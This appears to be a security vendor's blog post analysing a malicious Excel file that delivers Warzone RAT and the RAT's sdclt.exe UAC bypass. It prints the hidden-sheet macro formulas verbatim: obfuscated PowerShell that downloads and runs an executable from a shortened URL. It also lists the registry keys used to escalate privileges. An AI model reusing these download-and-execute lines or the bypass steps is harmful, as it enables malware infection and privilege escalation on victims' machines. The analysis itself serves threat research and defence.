            <div class="blog-post__body">
              <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Uptycs' <a href="/products/use-cases/threat-hunting" rel="noopener" target="_blank">threat research</a> team identified an XLS document that downloaded a highly vicious payload named Warzone RAT. The payload, also known as “Ave Maria stealer,” can steal credentials and log keystrokes on the victim’s machine. Checkpoint <a href="https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/"><span>mentioned</span></a> Warzone early this year when the malware was in its early stage of development.</p>
<p><!--more--></p>
<p>&nbsp;</p>
<p>The latest version of the malware is fully developed and is being sold in the underground market. The Warzone authors have an official website where cybercriminals can buy the malware.</p>
<p>&nbsp;</p>
<p>The site lists various features of the RAT and the pricing (the RAT can be rented for $22.95 per month and $49.95 for three months).</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=714&amp;name=Figure-1-warzone_site.png" alt="Warzone RAT official website." width="714" style="width: 714px;" srcset="https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=357&amp;name=Figure-1-warzone_site.png 357w, https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=714&amp;name=Figure-1-warzone_site.png 714w, https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=1071&amp;name=Figure-1-warzone_site.png 1071w, https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=1428&amp;name=Figure-1-warzone_site.png 1428w, https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=1785&amp;name=Figure-1-warzone_site.png 1785w, https://www.uptycs.com/hs-fs/hubfs/Figure-1-warzone_site.png?width=2142&amp;name=Figure-1-warzone_site.png 2142w" sizes="(max-width: 714px) 100vw, 714px"></p>
<p style="text-align: center;"><em>Figure 1: Warzone RAT official website.</em></p>
<p>&nbsp;</p>
<p>The Warzone developers rent out several products on their website:</p>
<ul>
<li>RAT</li>
<li>RAT Poison</li>
<li>Crypter</li>
<li>SILENT.doc exploit</li>
<li>SILENT EXCEL Exploit</li>
</ul>
<p>Here are various features of the RAT noted on the website:</p>
<ul>
<li>Native, independent stub</li>
<li>Remote Desktop</li>
<li>Hidden Remote Desktop - HRDP</li>
<li>Privilege Escalation - UAC Bypass</li>
<li>Remote WebCam</li>
<li>Password Recovery</li>
<li>File Manager</li>
<li>Download &amp; Execute</li>
<li>Live Keylogger</li>
<li>Offline Keylogger</li>
<li>Remote Shell</li>
<li>Process Manager</li>
<li>Reverse Proxy</li>
<li>Automatic Tasks</li>
<li>Mass Execute</li>
<li>Smart Updater</li>
<li>HRDP WAN Direct Connection</li>
<li>Persistence</li>
<li>Windows Defender Bypass</li>
</ul>
<p>We also discovered a cracked version of Warzone hosted on GitHub. Here’s a screenshot of the repo:</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=666&amp;name=figure-2-github.png" alt="A cracked version of Warzone on GitHub." width="666" style="width: 666px;" srcset="https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=333&amp;name=figure-2-github.png 333w, https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=666&amp;name=figure-2-github.png 666w, https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=999&amp;name=figure-2-github.png 999w, https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=1332&amp;name=figure-2-github.png 1332w, https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=1665&amp;name=figure-2-github.png 1665w, https://www.uptycs.com/hs-fs/hubfs/figure-2-github.png?width=1998&amp;name=figure-2-github.png 1998w" sizes="(max-width: 666px) 100vw, 666px"></p>
<p style="text-align: center;"><em>Figure 2: A cracked version of Warzone on GitHub.</em></p>
<p>&nbsp;</p>
<p>The instance of Warzone we trapped has the ability to bypass UAC on the latest version of Windows 10. In this blog we’re going to talk about the XLS used as the attack vector and the UAC bypass technique used.</p>
<p>&nbsp;</p>
<h2>The Malicious XLS</h2>
<p>The XLS used in the attack uses Excel 4.0 Macro, also known as XLM Macro. The XLM Macro feature has been part of Microsoft Excel for a long time, but we’ve seen a spike in its malicious usage for a few months now. Malware authors exploit this feature of Excel, which allows formulas to be written using macros.</p>
<p>&nbsp;</p>
<p>When we got hold of the XLS on November 11, only a few of the anti-malware vendors could detect it on Virustotal (see figure 3).</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=733&amp;name=Figure-3-virustotalDetections.png" alt="Detections on Virustotal." width="733" style="width: 733px;" srcset="https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=367&amp;name=Figure-3-virustotalDetections.png 367w, https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=733&amp;name=Figure-3-virustotalDetections.png 733w, https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=1100&amp;name=Figure-3-virustotalDetections.png 1100w, https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=1466&amp;name=Figure-3-virustotalDetections.png 1466w, https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=1833&amp;name=Figure-3-virustotalDetections.png 1833w, https://www.uptycs.com/hs-fs/hubfs/Figure-3-virustotalDetections.png?width=2199&amp;name=Figure-3-virustotalDetections.png 2199w" sizes="(max-width: 733px) 100vw, 733px"></p>
<p style="text-align: center;"><em>Figure 3: Detections on Virustotal.</em></p>
<p>&nbsp;</p>
<p>In the XLS file, the macros are implemented as formulas in a hidden sheet and are not visible if the XLS is opened. The macros are visible only after unhiding the sheet. The following screenshot shows the unhidden sheet with macro code embedded in the formula.</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=780&amp;name=Figure-4-unhidden-sheet.png" alt="Macro in unhidden sheet." width="780" style="width: 780px;" srcset="https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=390&amp;name=Figure-4-unhidden-sheet.png 390w, https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=780&amp;name=Figure-4-unhidden-sheet.png 780w, https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=1170&amp;name=Figure-4-unhidden-sheet.png 1170w, https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=1560&amp;name=Figure-4-unhidden-sheet.png 1560w, https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=1950&amp;name=Figure-4-unhidden-sheet.png 1950w, https://www.uptycs.com/hs-fs/hubfs/Figure-4-unhidden-sheet.png?width=2340&amp;name=Figure-4-unhidden-sheet.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></p>
<p style="text-align: center;"><em>Figure 4: Macro in unhidden sheet.</em></p>
<p>&nbsp;</p>
<p>Here’s the macro code in respective rows and columns:</p>
<ul>
<li><strong>Row 596 column E </strong>- =CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;CHAR(32)&amp;CHAR(47)&amp;CHAR(99)&amp;"powe^rshell -w 1 (nEw-oBje`cT Net.WebcL`IENt).('Down'+'loadFile').""""Invoke""""('https://cutt.ly/agJgRCy','gm.exe')"</li>
<li><strong>Row 597 column E</strong> - =CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;CHAR(32)&amp;CHAR(47)&amp;CHAR(99)&amp;"powe^rshell -w 1 stARt`-slE`Ep 20; Move-Item ""gm.exe"" -Destination ""${enV`:appdata}"""</li>
<li><strong>Row 598 column E </strong>- =CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;CHAR(32)&amp;CHAR(47)&amp;CHAR(99)&amp;"powe^rshell -w 1 stARt`-slE`Ep 25; cd ${enV`:appdata}; ./gm.exe"</li>
</ul>
<p>These macros are responsible for downloading and executing the Warzone RAT. The Warzone payload takes full control of the system after bypassing UAC and then steals information and monitors the victim’s machine.</p>
<p>Here’s the flow of the attack:</p>
<ul>
<li>The macro in the XLS file uses PowerShell to download and execute gm.exe, which is the Warzone RAT</li>

<h2>The Warzone RAT Payload: Win Over the UAC</h2>
<p>The Warzone RAT (gm.exe) is a 32-bit application and uses the sdclt.exe to bypass UAC and run at higher privileges. Sdclt.exe is a built-in Windows utility used for backup and restore purposes. Sdclt is designed to autoevelate its privilege and uses the control panel binary, control.exe, to back up and restore control panel settings.</p>
<p>&nbsp;</p>
<p>There are many UAC <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md"><span>bypass techniques</span></a> that are not effective on Windows 10 because of the default file system restrictions. A 32-bit application can’t access the native c:\windows\system32 directory because the operating system redirects the request to c:\windows\SysWOW64. Sdclt.exe and other UAC bypass binaries are 64-bit applications and are not available in the SysWOW64 directory.</p>
<p>&nbsp;</p>
<p>However, the operating system provides a mechanism to disable the file system redirection using Wow64DisableWow64FsRedirection API. So Warzone uses the Wow64DisableWow64FsRedirection API to disable the file system redirection to access the sdclt.exe that resides in the system32 directory (see figure 6, below).</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=780&amp;name=Figure-6-wow64Disable-API-call.png" alt="The call to the Wow64DisableWow64FsRedirection API disables file system redirection for a 32-bit application." width="780" style="width: 780px;" srcset="https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=390&amp;name=Figure-6-wow64Disable-API-call.png 390w, https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=780&amp;name=Figure-6-wow64Disable-API-call.png 780w, https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=1170&amp;name=Figure-6-wow64Disable-API-call.png 1170w, https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=1560&amp;name=Figure-6-wow64Disable-API-call.png 1560w, https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=1950&amp;name=Figure-6-wow64Disable-API-call.png 1950w, https://www.uptycs.com/hs-fs/hubfs/Figure-6-wow64Disable-API-call.png?width=2340&amp;name=Figure-6-wow64Disable-API-call.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></p>
<p style="text-align: center;"><em>Figure 6: The call to the Wow64DisableWow64FsRedirection API disables file system redirection for a 32-bit application.</em></p>
<p>&nbsp;</p>
<p>After disabling the redirection, the malware makes the following registry changes:</p>
<ul>
<li>Creates a new registry key HKCU\Software\Classes\Folder\shell\open\command</li>
<li>Sets the “Default” value to “path of the malware”</li>
<li>Creates a value “DelegateExecute” and sets the value to “0”</li>
<li>Executes %systemDirectory%sdclt.exe to bypass the UAC as shown below (figure 7)</li>
</ul>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=780&amp;name=Figure-7-sdclt-code.png" alt="The malware sets registry keys and calls sdclt.exe to bypass UAC." width="780" style="width: 780px;" srcset="https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=390&amp;name=Figure-7-sdclt-code.png 390w, https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=780&amp;name=Figure-7-sdclt-code.png 780w, https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=1170&amp;name=Figure-7-sdclt-code.png 1170w, https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=1560&amp;name=Figure-7-sdclt-code.png 1560w, https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=1950&amp;name=Figure-7-sdclt-code.png 1950w, https://www.uptycs.com/hs-fs/hubfs/Figure-7-sdclt-code.png?width=2340&amp;name=Figure-7-sdclt-code.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></p>
